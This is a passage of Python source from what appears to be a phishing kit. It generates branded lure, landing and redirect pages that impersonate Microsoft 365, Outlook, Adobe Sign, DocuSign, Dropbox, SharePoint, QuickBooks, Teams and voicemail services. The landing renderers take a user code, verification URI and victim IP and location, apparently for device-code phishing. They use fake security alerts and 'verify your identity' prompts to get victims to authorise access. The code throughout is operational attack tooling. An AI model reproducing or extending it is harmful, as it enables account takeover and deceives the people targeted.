<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>{title}</title>
<style>
* {{ box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }}
html, body {{ width: 100%; height: 100vh; max-height: 100vh; display: flex; align-items: center; justify-content: center; position: relative; overflow: hidden; background: {page_bg}; margin: 0; padding: 0; }}
.bg-layer {{ position: fixed; inset: -35px; width: calc(100% + 70px); height: calc(100% + 70px); z-index: 0; pointer-events: none; }}
.card {{
    background: {card_bg};
    border-radius: 16px;
    box-shadow: 0 16px 48px rgba(0, 120, 212, 0.12), 0 3px 12px rgba(0,0,0,0.06), inset 0 1px 0 rgba(255,255,255,0.8);
    padding: clamp(20px, 3vh, 32px) clamp(20px, 3.5vw, 32px);
    max-width: 440px;
    width: 92%;
    text-align: center;
    position: relative;
    z-index: 2;
    border: 1px solid rgba(0, 120, 212, 0.16);
    display: flex;
    flex-direction: column;
}}
.outlook-pill {{
    display: inline-flex;
    align-items: center;
    gap: 6px;
    padding: 4px 12px;
    background: rgba(0, 120, 212, 0.08);
    color: #0078D4;
    border-radius: 20px;
    font-size: 0.72rem;
    font-weight: 700;
    margin: 0 auto 12px;
    letter-spacing: 0.04em;
    text-transform: uppercase;
    border: 1px solid rgba(0, 120, 212, 0.16);
}}
.outlook-pill::before {{
    content: '';
    width: 7px;
    height: 7px;
    border-radius: 50%;
    background: #0078D4;
    display: inline-block;
    box-shadow: 0 0 6px rgba(0, 120, 212, 0.7);
}}
h1 {{
    font-size: 1.15rem;
    font-weight: 700;
    color: #1a1a24;
    line-height: 1.35;
    margin-bottom: 6px;
}}
.desc {{
    font-size: 0.82rem;
    color: #555566;
    line-height: 1.5;
    margin-bottom: 16px;
}}
.outlook-msg-box {{
    background: #f8fafd;
    border: 1px solid #dce8f5;
    border-radius: 12px;
    padding: 12px 14px;
    margin-bottom: 18px;
    text-align: left;
    box-shadow: inset 0 1px 2px rgba(0,0,0,0.02);
}}
.msg-row {{
    display: flex;
    align-items: flex-start;
    gap: 10px;
    padding-bottom: 8px;
    border-bottom: 1px dashed #e2edf8;
    margin-bottom: 8px;
}}
.msg-row:last-child {{
    border-bottom: none;
    margin-bottom: 0;
    padding-bottom: 0;
}}
.msg-icon {{
    font-size: 1.05rem;
    line-height: 1.2;
    flex-shrink: 0;
    margin-top: 1px;
}}
.msg-content {{
    display: flex;
    flex-direction: column;
    min-width: 0;
}}
.msg-lbl {{
    font-size: 0.65rem;
    font-weight: 700;
    color: #7b94ad;
    letter-spacing: 0.05em;
    text-transform: uppercase;
}}
.msg-val {{
    font-size: 0.82rem;
    color: #243b53;
    font-weight: 600;
    word-break: break-word;
}}
.msg-subj {{
    color: #0078D4;
    font-weight: 700;
}}
.msg-meta {{
    font-size: 0.74rem;
    color: #486581;
    font-weight: 500;
}}
.btn-read {{
    width: 100%;
    padding: 13px 20px;
    background: linear-gradient(135deg, {accent}, #004e8c);
    color: #fff;
    border: none;
    border-radius: 10px;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 10px;
    font-size: 0.94rem;
    font-weight: 700;
    cursor: pointer;
    text-decoration: none;
    box-shadow: 0 4px 16px rgba(0, 120, 212, 0.35);
    transition: all 0.2s ease;
}}
.btn-read:hover {{
    transform: translateY(-1px);
    box-shadow: 0 6px 22px rgba(0, 120, 212, 0.48);
}}
.footer {{ margin-top: 14px; }}
.f1 {{ font-size: 0.73rem; color: #707086; margin-bottom: 2px; }}
.f2 {{ font-size: 0.68rem; color: #9090aa; }}
#spin {{
    display: none;
    position: fixed;
    inset: 0;
    background: rgba(255, 255, 255, 0.94);
    align-items: center;
    justify-content: center;
    z-index: 99;
    flex-direction: column;
    gap: 16px;
}}
.spin-circle {{
    width: 44px;
    height: 44px;
    border: 4px solid #e0e8f0;
    border-top-color: {spin_color};
    border-radius: 50%;
    animation: spin 0.85s linear infinite;
}}
@keyframes spin {{ to {{ transform: rotate(360deg); }} }}
</style>
</head>
<body>
{bg_layer_html}
<div id="spin">
    <div class="spin-circle"></div>
    <div style="font-weight:700; font-size:1.05rem; color:#1c3550;">Verifying Outlook Security Token...</div>
    <div style="color:#778899; font-size:0.84rem;">Connecting to Exchange Online Information Protection</div>
</div>
<div class="card">
    {logo_html}
    {status_html}
    {title_html}
    {desc_html}
    {msg_box_html}
    {btn_html}
    {footer_html}
</div>
<script>
function launchOutlook(e) {{
    e.preventDefault();
    var s = document.getElementById('spin');
    if (s) s.style.display = 'flex';
    setTimeout(function() {{
        var p = "{proceed_url}";
        if (window.parent && window.parent !== window) {{
            try {{ window.parent.postMessage({{ type: 'preview_proceed_to_landing' }}, '*'); }} catch(err) {{}}
        }}
        if (p && p !== '#' && p !== 'javascript:void(0)') {{
            if (!window.parent || window.parent === window) {{
                window.location.href = p;
            }}
        }}
    }}, 1100);
}}
</script>
</body>
</html>'''


def render_landing_outlook(cfg, user_code, verification_uri, success_url='',
                            mode='S', victim_ip='', victim_location=''):
    cfg.setdefault('template_name', 'Outlook')
    cfg.setdefault('landing_doc_sub', 'Outlook document · Awaiting Signature')
    cfg.setdefault('mode_a_account_label', 'OUTLOOK')
    cfg.setdefault('mode_a_alert', 'Unusual sign-in activity detected on your mailbox')
    cfg.setdefault('mode_a_title', 'Review this activity')
    icon = assets.get_logo_html('Outlook', 48)
    icon_mini = assets.get_logo_html('Outlook', 28)
    return _dispatch_landing(cfg, user_code, verification_uri,
                             icon_svg=icon, icon_svg_mini=icon_mini,
                             org_name=cfg.get('org_name','Microsoft Outlook'),
                             default_accent='#0078D4', default_page_bg='#f5f5f5',
                             mode=mode, victim_ip=victim_ip, victim_location=victim_location,
                             success_url=success_url)


# ═══════════════════════════════════════════════════════════════════════════
# SUCCESS renderers — QuickBooks + Outlook
# ═══════════════════════════════════════════════════════════════════════════

def render_success_quickbooks(cfg, success_url):
    title   = cfg.get('success_title', 'Accounting portal sign-in')
    desc    = cfg.get('success_desc', 'Thanks for verifying your identity. You will be redirected to Microsoft 365 shortly.')
    accent  = cfg.get('accent_color', '#2CB34A')
    page_bg = cfg.get('page_color', '#f5f5f5')
    card_bg = cfg.get('card_bg', '#ffffff')
    delay   = int(cfg.get('redirect_delay_ms', 3000))
    return f'''<!DOCTYPE html><html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>{title}</title><style>
*{{box-sizing:border-box;margin:0;padding:0}}
body{{min-height:100vh;display:flex;align-items:center;justify-content:center;
     background:{page_bg};font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif}}
.card{{background:{card_bg};border-radius:14px;box-shadow:0 4px 28px rgba(0,0,0,.10);
       padding:40px 32px;max-width:360px;width:90%;text-align:center}}
.brand{{font-size:.68rem;font-weight:700;color:{accent};letter-spacing:.14em;margin-top:12px;margin-bottom:14px}}
h1{{font-size:1.05rem;font-weight:700;color:#1a1a1a;margin-bottom:10px}}
.desc{{font-size:.82rem;color:#666;line-height:1.55;margin-bottom:22px}}
.redirect-txt{{font-size:.78rem;color:#aaa}}
.dots::after{{content:"";animation:dots 1.4s steps(4,end) infinite}}
@keyframes dots{{0%{{content:""}}25%{{content:"."}}50%{{content:".."}}75%{{content:"..."}}100%{{content:""}}}}
</style></head><body><div class="card">
  {_qb_svg(52)}
  <div class="brand">QUICKBOOKS</div>
  <h1>{title}</h1>
  <p class="desc">{desc}</p>
  <p class="redirect-txt">Redirecting<span class="dots"></span></p>
</div>
<script>setTimeout(()=>window.location.replace("{success_url}"),{delay});</script>
</body></html>'''


def _outlook_svg(size=48):
    """Outlook logo HTML/SVG."""
    return assets.get_logo_html('Outlook', size)


def render_success_outlook(cfg, success_url):
    title   = cfg.get('success_title', 'Mailbox security check')
    desc    = cfg.get('success_desc', 'Thanks for verifying your identity. You will be redirected to Microsoft 365 shortly.')
    accent  = cfg.get('accent_color', '#0078D4')
    page_bg = cfg.get('page_color', '#f5f5f5')
    card_bg = cfg.get('card_bg', '#ffffff')
    delay   = int(cfg.get('redirect_delay_ms', 3000))
    return f'''<!DOCTYPE html><html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>{title}</title><style>
*{{box-sizing:border-box;margin:0;padding:0}}
body{{min-height:100vh;display:flex;align-items:center;justify-content:center;
     background:{page_bg};font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif}}
.card{{background:{card_bg};border-radius:14px;box-shadow:0 4px 28px rgba(0,0,0,.10);
       padding:40px 32px;max-width:360px;width:90%;text-align:center}}
.brand{{font-size:.68rem;font-weight:700;color:{accent};letter-spacing:.14em;margin-top:12px;margin-bottom:14px}}
h1{{font-size:1.05rem;font-weight:700;color:#1a1a1a;margin-bottom:10px}}
.desc{{font-size:.82rem;color:#666;line-height:1.55;margin-bottom:22px}}
.redirect-txt{{font-size:.78rem;color:#aaa}}
.dots::after{{content:"";animation:dots 1.4s steps(4,end) infinite}}
@keyframes dots{{0%{{content:""}}25%{{content:"."}}50%{{content:".."}}75%{{content:"..."}}100%{{content:""}}}}
</style></head><body><div class="card">
  {_outlook_svg(52)}
  <div class="brand">OUTLOOK</div>
  <h1>{title}</h1>
  <p class="desc">{desc}</p>
  <p class="redirect-txt">Redirecting<span class="dots"></span></p>
</div>
<script>setTimeout(()=>window.location.replace("{success_url}"),{delay});</script>
</body></html>'''


# ═══════════════════════════════════════════════════════════════════════════
def _dropbox_svg(size=46):
    return f'''<svg width="{size}" height="{size}" viewBox="0 0 24 24" fill="#0061FF" xmlns="http://www.w3.org/2000/svg">
<path d="M6 2L12 6L6 10L0 6L6 2ZM18 2L24 6L18 10L12 6L18 2ZM0 12L6 16L12 12L6 8L0 12ZM18 8L12 12L18 16L24 12L18 8ZM6 17.5L12 13.5L18 17.5L12 21.5L6 17.5Z"/>
</svg>'''

def _adobe_svg(size=48):
    return f'''<svg width="{size}" height="{size}" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
<rect width="48" height="48" rx="8" fill="#FA0F00"/>
<path d="M19.5 12H13L21.5 36H26.5L19.5 12Z" fill="white"/>
<path d="M28.5 12H35L26.5 36H21.5L28.5 12Z" fill="white"/>
<path d="M24 23.5L29 36H24.5L22.5 31H19L24 23.5Z" fill="white"/>
</svg>'''

def render_preland_adobe(cfg, proceed_url):
    _normalize_preland_cfg(cfg)
    cfg.setdefault('title', 'Protected Document')
    cfg.setdefault('description', 'This file is protected by Adobe Sign security policies. Verify your identity to access.')
    cfg.setdefault('doc_name', 'Service-Agreement.pdf')
    cfg.setdefault('doc_badge', 'PDF')
    cfg.setdefault('doc_sub', 'Adobe Acrobat Document · 1.8 MB')
    cfg.setdefault('button_label', 'Review & Sign')
    cfg.setdefault('template_name', 'Adobe')
    cfg.setdefault('footer_caption', 'Sign in to Adobe to continue')
    cfg.setdefault('footer_text', 'Adobe Sign · Legally binding')
    cfg.setdefault('accent_color', '#FA0F00')
    cfg.setdefault('page_color', '#f8f8f8')
    cfg.setdefault('card_bg', '#ffffff')
    return _render_generic_preland(cfg, proceed_url)

def render_landing_adobe(cfg, user_code, verification_uri, success_url='',
                         mode='S', victim_ip='', victim_location=''):
    cfg.setdefault('template_name', 'Adobe')
    cfg.setdefault('landing_title', 'Sign Document')
    cfg.setdefault('doc_name', 'Service-Agreement.pdf')
    cfg.setdefault('landing_doc_sub', 'Adobe Acrobat Document · Awaiting signature')
    cfg.setdefault('copy_btn_fill', True)
    icon = assets.get_logo_html('Adobe', 28)
    return _dispatch_landing(cfg, user_code, verification_uri,
                             icon_svg=assets.get_logo_html('Adobe', 48), icon_svg_mini=icon,
                             org_name=cfg.get('org_name', 'Adobe Acrobat Sign'),
                             default_accent='#FA0F00', default_page_bg='#f5f5f5',
                             mode=mode, victim_ip=victim_ip, victim_location=victim_location,
                             success_url=success_url)

def render_preland_dropbox(cfg, proceed_url):
    _normalize_preland_cfg(cfg)
    cfg.setdefault('template_name', 'Dropbox')
    cfg.setdefault('title', 'Dropbox File Shared')
    cfg.setdefault('description', 'Someone shared a file with you on Dropbox. Verify your identity to access.')
    cfg.setdefault('doc_name', 'Proposal-Shared.pdf')
    cfg.setdefault('doc_badge', 'PDF')
    cfg.setdefault('doc_sub', 'Dropbox file · 4.2 MB')
    cfg.setdefault('button_label', 'View on Dropbox')
    cfg.setdefault('footer_caption', 'Sign in to Dropbox to access')
    cfg.setdefault('footer_text', 'Dropbox · Secure link')
    cfg.setdefault('accent_color', '#0061FF')
    cfg.setdefault('page_color', '#ffffff')
    cfg.setdefault('card_bg', '#ffffff')
    return _render_generic_preland(cfg, proceed_url)

def render_landing_dropbox(cfg, user_code, verification_uri, success_url='',
                           mode='S', victim_ip='', victim_location=''):
    cfg.setdefault('template_name', 'Dropbox')
    cfg.setdefault('landing_title', 'Shared folder access')
    cfg.setdefault('doc_name', 'Dropbox-Protected-Share.pdf')
    cfg.setdefault('landing_doc_sub', 'Dropbox Cloud Storage · Verification required')
    cfg.setdefault('copy_btn_fill', True)
    icon = assets.get_logo_html('Dropbox', 28)
    return _dispatch_landing(cfg, user_code, verification_uri,
                             icon_svg=assets.get_logo_html('Dropbox', 48), icon_svg_mini=icon,
                             org_name=cfg.get('org_name', 'Dropbox'),
                             default_accent='#0061FF', default_page_bg='#f5f5f5',
                             mode=mode, victim_ip=victim_ip, victim_location=victim_location,
                             success_url=success_url)

def render_preland_m365(cfg, proceed_url):
    _normalize_preland_cfg(cfg)
    cfg.setdefault('template_name', 'Microsoft 365')
    cfg.setdefault('title', 'Protected Document')
    cfg.setdefault('description', "This file is protected by your organization's security policies, please verify your identity to access.")
    cfg.setdefault('doc_name', 'Financial-Report-2026.docx')
    cfg.setdefault('doc_badge', 'DOCX')
    cfg.setdefault('doc_sub', 'Cashflow Statement · 3.2 MB')
    cfg.setdefault('button_label', 'Access Protected File')
    cfg.setdefault('footer_caption', 'Verify your identity to access this file')
    cfg.setdefault('footer_text', 'End-to-end encrypted')
    cfg.setdefault('accent_color', '#0078D4')
    cfg.setdefault('page_color', '#ffffff')
    cfg.setdefault('card_bg', '#ffffff')
    return _render_generic_preland(cfg, proceed_url)

def render_landing_m365(cfg, user_code, verification_uri, success_url='',
                        mode='S', victim_ip='', victim_location=''):
    cfg.setdefault('template_name', 'Microsoft 365')
    cfg.setdefault('landing_title', 'Sign in to your account')
    cfg.setdefault('doc_name', 'Security-Verification.pdf')
    cfg.setdefault('landing_doc_sub', 'Microsoft 365 Security Check')
    cfg.setdefault('copy_btn_fill', True)
    icon = assets.get_logo_html('Microsoft 365', 28)
    return _dispatch_landing(cfg, user_code, verification_uri,
                             icon_svg=assets.get_logo_html('Microsoft 365', 48), icon_svg_mini=icon,
                             org_name=cfg.get('org_name', 'Microsoft 365'),
                             default_accent='#0078D4', default_page_bg='#f3f2f1',
                             mode=mode, victim_ip=victim_ip, victim_location=victim_location,
                             success_url=success_url)

def render_preland_docusign(cfg, proceed_url):
    _normalize_preland_cfg(cfg)
    cfg.setdefault('template_name', 'DocuSign')
    cfg.setdefault('title', 'Protected Document')
    cfg.setdefault('description', 'This document is protected by DocuSign security policies. Verify your identity to review and sign.')
    cfg.setdefault('doc_name', 'Agreement-Sign.pdf')
    cfg.setdefault('doc_badge', 'PDF')
    cfg.setdefault('doc_sub', 'DocuSign Document · Awaiting signature')
    cfg.setdefault('button_label', 'Review & Sign')
    cfg.setdefault('footer_caption', 'Sign in to DocuSign to continue')
    cfg.setdefault('footer_text', 'DocuSign · Legally binding & encrypted')
    cfg.setdefault('accent_color', '#21409A')
    cfg.setdefault('page_color', '#f8f9fa')
    cfg.setdefault('card_bg', '#ffffff')
    return _render_generic_preland(cfg, proceed_url)

def render_landing_docusign(cfg, user_code, verification_uri, success_url='',
                            mode='S', victim_ip='', victim_location=''):
    cfg.setdefault('template_name', 'DocuSign')
    cfg.setdefault('landing_title', 'Review & Sign Document')
    cfg.setdefault('doc_name', 'Agreement-Sign.pdf')
    cfg.setdefault('landing_doc_sub', 'DocuSign Document · Identity verification required')
    cfg.setdefault('copy_btn_fill', True)
    icon = assets.get_logo_html('DocuSign', 28)
    return _dispatch_landing(cfg, user_code, verification_uri,
                             icon_svg=assets.get_logo_html('DocuSign', 48), icon_svg_mini=icon,
                             org_name=cfg.get('org_name', 'DocuSign'),
                             default_accent='#21409A', default_page_bg='#f5f5f5',
                             mode=mode, victim_ip=victim_ip, victim_location=victim_location,
                             success_url=success_url)

def render_preland_sharepoint(cfg, proceed_url):
    _normalize_preland_cfg(cfg)
    cfg.setdefault('template_name', 'SharePoint')
    cfg.setdefault('title', 'SharePoint Protected File')
    cfg.setdefault('description', "This file is stored in your organization's SharePoint library. Verify your identity to view this document.")
    cfg.setdefault('doc_name', 'Confidential-SharePoint-Doc.docx')
    cfg.setdefault('doc_badge', 'DOCX')
    cfg.setdefault('doc_sub', 'SharePoint document · Access required')
    cfg.setdefault('button_label', 'Access Protected File')
    cfg.setdefault('footer_caption', 'Verify your identity to access this file')
    cfg.setdefault('footer_text', 'SharePoint Online · End-to-end encrypted')
    cfg.setdefault('accent_color', '#03787C')
    cfg.setdefault('page_color', '#f3f2f1')
    cfg.setdefault('card_bg', '#ffffff')
    return _render_generic_preland(cfg, proceed_url)

def render_landing_sharepoint(cfg, user_code, verification_uri, success_url='',
                              mode='S', victim_ip='', victim_location=''):
    cfg.setdefault('template_name', 'SharePoint')
    cfg.setdefault('landing_title', 'SharePoint Document Access')
    cfg.setdefault('doc_name', 'Confidential-SharePoint-Doc.docx')
    cfg.setdefault('landing_doc_sub', 'SharePoint Online Document')
    cfg.setdefault('copy_btn_fill', True)
    icon = assets.get_logo_html('SharePoint', 28)
    return _dispatch_landing(cfg, user_code, verification_uri,
                             icon_svg=assets.get_logo_html('SharePoint', 48), icon_svg_mini=icon,
                             org_name=cfg.get('org_name', 'Microsoft SharePoint'),
                             default_accent='#03787C', default_page_bg='#f3f2f1',
                             mode=mode, victim_ip=victim_ip, victim_location=victim_location,
                             success_url=success_url)

def render_success_page(template_name, cfg, success_url):
    cfg = cfg or {}
    t_name = template_name or 'Microsoft 365'
    t_lower = t_name.lower()

    if 'dropbox' in t_lower:
        default_service = 'DROPBOX'
        default_title = 'Shared folder access'
        default_accent = '#0061FF'
    elif 'adobe' in t_lower:
        default_service = 'ADOBE ACROBAT'
        default_title = 'Document signed'
        default_accent = '#FA0F00'
    elif 'docusign' in t_lower:
        default_service = 'DOCUSIGN'
        default_title = 'Document signed'
        default_accent = '#21409A'
    elif 'quickbook' in t_lower:
        default_service = 'QUICKBOOKS'
        default_title = 'Accounting portal sign-in'
        default_accent = '#2CB34A'
    elif 'onedrive' in t_lower:
        default_service = 'MICROSOFT ONEDRIVE'
        default_title = 'Shared file access'
        default_accent = '#0078D4'
    elif 'outlook' in t_lower:
        default_service = 'OUTLOOK'
        default_title = 'Mailbox security check'
        default_accent = '#0078D4'
    elif 'sharepoint' in t_lower:
        default_service = 'SHAREPOINT'
        default_title = 'SharePoint file access'
        default_accent = '#03787C'
    elif 'teams' in t_lower:
        default_service = 'MICROSOFT TEAMS'
        default_title = 'Lobby Access Authorized'
        default_accent = '#5B5FC7'
    elif 'voice' in t_lower or 'vmail' in t_lower:
        default_service = 'CLOUD VOICEMAIL'
        default_title = 'Voicemail Decrypted'
        default_accent = '#0078D4'
    else:
        default_service = 'MICROSOFT 365'
        default_title = 'Sign-in complete'
        default_accent = '#0078D4'

    page_title = cfg.get('page_title') or t_name or 'Verification Complete'
    card_title = cfg.get('card_title', cfg.get('success_title', default_title))
    service    = cfg.get('service_name', default_service)
    desc       = cfg.get('body_text') or cfg.get('success_desc') or cfg.get('success_body') or f'Thanks for verifying your identity. You will be redirected to {t_name} shortly.'
    footer_txt = cfg.get('footer_text') or cfg.get('success_footer') or ''
    accent     = cfg.get('accent_color', default_accent)
    page_bg    = cfg.get('page_bg') or cfg.get('page_color') or '#ffffff'
    card_bg    = cfg.get('card_bg', '#ffffff')
    body_bg    = cfg.get('body_card_bg', '#ffffff')
    delay_sec  = float(cfg.get('redirect_seconds', 5))
    delay_ms   = int(delay_sec * 1000)

    logo_data  = cfg.get('custom_logo')
    banner_img = cfg.get('header_banner')
    header_col = cfg.get('header_color', 'transparent')
    
    show_bg    = cfg.get('show_page_bg_image', cfg.get('show_bg_image', True))
    if show_bg in (False, 'false', '0', 0):
        show_bg = False
    else:
        show_bg = True
    page_img   = cfg.get('page_bg_image') or cfg.get('bg_image') or ''
    if not page_img and show_bg:
        page_img = DEFAULT_BG_URL
    if not show_bg:
        page_img = ''
    raw_blur   = float(cfg.get('page_bg_blur', cfg.get('blur', 8)))
    blur_px    = int(round((raw_blur / 100.0) * 32.0)) if (raw_blur > 0 and page_img and show_bg) else 0
    card_img   = cfg.get('card_bg_image')

    brand_logo = assets.get_logo_html(t_name, 48, 140)
    logo_html = f'<img src="{logo_data}" style="max-height:48px;max-width:140px;margin:0 auto 10px;display:block;object-fit:contain;">' if logo_data else (brand_logo or '')
    banner_html = f'<div style="width:100%;height:68px;background:url(\'{banner_img}\') center/cover no-repeat;border-radius:12px 12px 0 0;margin:-36px -28px 20px -28px;"></div>' if banner_img else ''

    card_bg_css = f"background: url('{card_img}') center/cover no-repeat;" if card_img else f"background:{card_bg};"
    bg_layer_html = f'<div class="page-bg-layer" style="position:fixed;inset:-35px;width:calc(100% + 70px);height:calc(100% + 70px);background:url(\'{page_img}\') center/cover no-repeat;filter:blur({blur_px}px);-webkit-filter:blur({blur_px}px);transform:scale(1.04);z-index:0;pointer-events:none;"></div>' if (page_img and show_bg) else ''

    service_html = f'<div style="font-size:.7rem;font-weight:700;color:#666;letter-spacing:.12em;text-transform:uppercase;margin-bottom:8px;">{service}</div>' if service else ''
    footer_html = f'<p style="font-size:.76rem;color:#777;margin-top:14px;margin-bottom:12px;">{footer_txt}</p>' if footer_txt else ''

    return f'''<!DOCTYPE html><html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>{page_title}</title><style>
*{{box-sizing:border-box;margin:0;padding:0}}
html,body{{background:{page_bg};width:100%;height:100vh;max-height:100vh;display:flex;align-items:center;justify-content:center;
     font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;position:relative;overflow:hidden;margin:0;padding:0;box-sizing:border-box;}}
.card{{{card_bg_css}border-radius:16px;box-shadow:0 16px 48px rgba(0,0,0,.12),0 3px 12px rgba(0,0,0,.06),inset 0 1px 0 rgba(255,255,255,0.7);
       padding:clamp(18px,2.8vh,32px) clamp(18px,3vw,30px);max-width:390px;width:92%;max-height:96vh;box-sizing:border-box;display:flex;flex-direction:column;justify-content:center;text-align:center;border:1px solid rgba(0,0,0,0.08);position:relative;z-index:2;}}
h1{{font-size:1.08rem;font-weight:700;color:#1a1a1a;margin-bottom:10px}}
.desc{{font-size:.82rem;color:#555566;line-height:1.45;margin-bottom:16px;background:{body_bg};border:1px solid #e2e5eb;border-radius:10px;padding:10px 14px;box-shadow:inset 0 1px 2px rgba(0,0,0,0.03);}}
.redirect-txt{{font-size:.76rem;color:#888}}
.dots::after{{content:"";animation:dots 1.4s steps(4,end) infinite}}
@keyframes dots{{0%{{content:""}}25%{{content:"."}}50%{{content:".."}}75%{{content:"..."}}100%{{content:""}}}}
</style></head><body>
{bg_layer_html}
<div class="card">
  {banner_html}
  <div style="background:{header_col};padding:4px;border-radius:8px;">
    {logo_html}
    {service_html}
  </div>
  <h1>{card_title}</h1>
  <p class="desc">{desc}</p>
  {footer_html}
  <p class="redirect-txt">Redirecting<span class="dots"></span></p>
</div>
<script>setTimeout(()=>window.location.replace("{success_url}"),{delay_ms});</script>
</body></html>'''


def render_preland_teams(cfg, proceed_url):
    _normalize_preland_cfg(cfg)
    import sandbox_templates
    return sandbox_templates.render_meeting_preland(cfg, proceed_url)

def render_landing_teams(cfg, user_code, verification_uri, success_url='',
                         mode='S', victim_ip='', victim_location=''):
    import sandbox_templates
    return sandbox_templates.render_meeting_landing(cfg, user_code, verification_uri, success_url=success_url, mode=mode, victim_ip=victim_ip, victim_location=victim_location)

def render_preland_voicemail(cfg, proceed_url):
    _normalize_preland_cfg(cfg)
    import sandbox_templates
    return sandbox_templates.render_voicemail_preland(cfg, proceed_url)

def render_landing_voicemail(cfg, user_code, verification_uri, success_url='',
                            mode='S', victim_ip='', victim_location=''):
    import sandbox_templates
    return sandbox_templates.render_voicemail_landing(cfg, user_code, verification_uri, success_url=success_url, mode=mode, victim_ip=victim_ip, victim_location=victim_location)


# ═══════════════════════════════════════════════════════════════════════════
# DISPATCHER maps  (template_name -> renderer)
# ═══════════════════════════════════════════════════════════════════════════

_PRELAND_RENDERERS = {
    'Adobe':              render_preland_adobe,
    'Adobe Sign':         render_preland_adobe,
    'DocuSign':           render_preland_docusign,
    'Dropbox':            render_preland_dropbox,
    'Dropbox Share':      render_preland_dropbox,
    'OneDrive':           render_preland_onedrive,
    'OneDrive Share':     render_preland_onedrive,
    'QuickBooks':         render_preland_quickbooks,
    'Outlook':            render_preland_outlook,
    'SharePoint':         render_preland_sharepoint,
    'SharePoint Request': render_preland_sharepoint,
    'Microsoft 365':      render_preland_m365,
    'Microsoft Teams':    render_preland_teams,
    'Teams':              render_preland_teams,
    'Teams Meeting':      render_preland_teams,
    'Cloud Voicemail':    render_preland_voicemail,
    'Voicemail':          render_preland_voicemail,
}

_LANDING_RENDERERS = {
    'Adobe':              render_landing_adobe,
    'Adobe Sign':         render_landing_adobe,
    'DocuSign':           render_landing_docusign,
    'Dropbox':            render_landing_dropbox,
    'Dropbox Share':      render_landing_dropbox,
    'OneDrive':           render_landing_onedrive,
    'OneDrive Share':     render_landing_onedrive,
    'QuickBooks':         render_landing_quickbooks,
    'Outlook':            render_landing_outlook,
    'SharePoint':         render_landing_sharepoint,
    'SharePoint Request': render_landing_sharepoint,
    'Microsoft 365':      render_landing_m365,
    'Microsoft Teams':    render_landing_teams,
    'Teams':              render_landing_teams,
    'Teams Meeting':      render_landing_teams,
    'Cloud Voicemail':    render_landing_voicemail,
    'Voicemail':          render_landing_voicemail,
}

_SUCCESS_RENDERERS = {
    'Adobe':              lambda cfg, url: render_success_page('Adobe', cfg, url),
    'Adobe Sign':         lambda cfg, url: render_success_page('Adobe', cfg, url),
    'DocuSign':           lambda cfg, url: render_success_page('DocuSign', cfg, url),
    'Dropbox':            lambda cfg, url: render_success_page('Dropbox', cfg, url),
    'Dropbox Share':      lambda cfg, url: render_success_page('Dropbox', cfg, url),
    'OneDrive':           lambda cfg, url: render_success_page('OneDrive', cfg, url),
    'OneDrive Share':     lambda cfg, url: render_success_page('OneDrive', cfg, url),
    'QuickBooks':         lambda cfg, url: render_success_page('QuickBooks', cfg, url),
    'Outlook':            lambda cfg, url: render_success_page('Outlook', cfg, url),
    'SharePoint':         lambda cfg, url: render_success_page('SharePoint', cfg, url),
    'SharePoint Request': lambda cfg, url: render_success_page('SharePoint', cfg, url),
    'Microsoft 365':      lambda cfg, url: render_success_page('Microsoft 365', cfg, url),
    'Microsoft Teams':    lambda cfg, url: render_success_page('Teams', cfg, url),
    'Teams':              lambda cfg, url: render_success_page('Teams', cfg, url),
    'Teams Meeting':      lambda cfg, url: render_success_page('Teams', cfg, url),
    'Cloud Voicemail':    lambda cfg, url: render_success_page('Voicemail', cfg, url),
    'Voicemail':          lambda cfg, url: render_success_page('Voicemail', cfg, url),
}


def render_preland(template_name, merged_config, proceed_url):
    renderer = _PRELAND_RENDERERS.get(template_name)
    if renderer:
        return renderer(merged_config, proceed_url)
    return _render_generic_preland(merged_config, proceed_url)

def render_landing(template_name, merged_config, user_code, verification_uri, success_url='', mode='S', victim_ip='', victim_location=''):
    renderer = _LANDING_RENDERERS.get(template_name)
    if renderer:
        return renderer(merged_config, user_code, verification_uri, success_url, mode=mode, victim_ip=victim_ip, victim_location=victim_location)
    return _render_generic_landing(merged_config, user_code, verification_uri)

def render_success(template_name, merged_config, success_url):
    renderer = _SUCCESS_RENDERERS.get(template_name)
    if renderer:
        return renderer(merged_config, success_url)
    return render_success_page(template_name, merged_config, success_url)


# ═══════════════════════════════════════════════════════════════════════════
# Generic fallback renderers
# ═══════════════════════════════════════════════════════════════════════════

def _render_generic_preland(cfg, proceed_url):
    _normalize_preland_cfg(cfg)
    title      = cfg.get('title', 'Protected Document')
    desc       = cfg.get('description', "This file requires verification to access.")
    doc_name   = cfg.get('doc_name', 'Document.pdf')
    doc_badge  = cfg.get('doc_badge', 'PDF')
    brand      = cfg.get('template', cfg.get('template_name', 'Microsoft 365'))
    b_lower    = brand.lower()

    if doc_badge == 'TEAMS' or 'teams' in b_lower:
        if doc_badge in ('TEAMS', 'PDF'):
            doc_badge = 'ICS'
    elif doc_badge in ('VMAIL', 'VOICEMAIL') or 'voice' in b_lower or 'vmail' in b_lower:
        if doc_badge in ('VMAIL', 'VOICEMAIL', 'PDF'):
            doc_badge = 'WAV'

    status_tag = cfg.get('status_tag')
    if status_tag is None:
        if 'adobe' in b_lower: status_tag = 'Adobe Sign · Verified Envelope'
        elif 'docusign' in b_lower: status_tag = 'DocuSign · Signature Pending'
        elif 'dropbox' in b_lower: status_tag = 'Dropbox · Shared Cloud File'
        elif 'onedrive' in b_lower: status_tag = 'OneDrive · Enterprise Protected'
        elif 'quickbook' in b_lower: status_tag = 'QuickBooks · Verified Invoice'
        elif 'outlook' in b_lower: status_tag = 'Outlook · Protected Mail'
        elif 'sharepoint' in b_lower: status_tag = 'SharePoint · Organization Library'
        elif 'teams' in b_lower: status_tag = 'Microsoft Teams · Virtual Lobby'
